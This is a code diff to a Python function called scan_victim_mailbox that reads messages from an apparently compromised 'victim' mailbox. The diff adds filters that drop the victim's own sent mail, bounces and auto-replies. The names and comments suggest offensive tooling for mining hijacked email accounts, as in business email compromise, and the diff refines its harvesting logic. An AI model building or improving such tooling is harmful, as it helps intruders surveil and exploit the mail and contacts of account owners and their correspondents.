@@ -230,13 +230,34 @@ def scan_victim_mailbox(session, rules=None):
 
             sender_obj = msg.get('from', {}).get('emailAddress', {})
             sender_addr = (sender_obj.get('address') or '').strip().lower()
-            sender = f"{sender_obj.get('name','')} <{sender_obj.get('address','')}>".strip()
+            sender_name = (sender_obj.get('name') or '').strip()
+            sender = f"{sender_name} <{sender_addr}>".strip()
 
-            # Guard: Ignore emails sent by the victim/operator themselves (outbound B2B campaigns / test sends)
-            if v_email_clean and sender_addr and sender_addr == v_email_clean:
+            # Guard 1: Ignore emails sent by the victim/operator themselves (outbound B2B campaigns / test sends)
+            # Checks exact address, username before @ (handles custom vs .onmicrosoft.com domains), and display name
+            is_self_sent = False
+            if sender_addr:
+                if v_email_clean and sender_addr == v_email_clean:
+                    is_self_sent = True
+                elif v_email_clean and '@' in sender_addr and '@' in v_email_clean:
+                    if sender_addr.split('@')[0] == v_email_clean.split('@')[0]:
+                        is_self_sent = True
+                if not is_self_sent and victim_name and len(victim_name) > 3 and victim_name.lower() in sender_name.lower():
+                    is_self_sent = True
+            if is_self_sent:
                 continue
 
-            subject = msg.get('subject') or ''
+            # Guard 2: Ignore Non-Delivery Reports (NDRs), system bounces, delivery failure notifications, auto-replies
+            subject = (msg.get('subject') or '').strip()
+            subj_lower = subject.lower()
+            if any(sig in sender_addr for sig in ('microsoftexchange', 'mailer-daemon', 'postmaster', 'systemadministrator')):
+                continue
+            if any(subj_lower.startswith(bp) for bp in (
+                'undeliverable:', 'delivery has failed', 'delivery status notification',
+                'failure notice', 'returned mail:', 'undelivered mail', 'automatic reply:', 'out of office:'
+            )):
+                continue
+
             body_preview = msg.get('bodyPreview') or ''
 
             def _fmt_recipients(recipients_list):
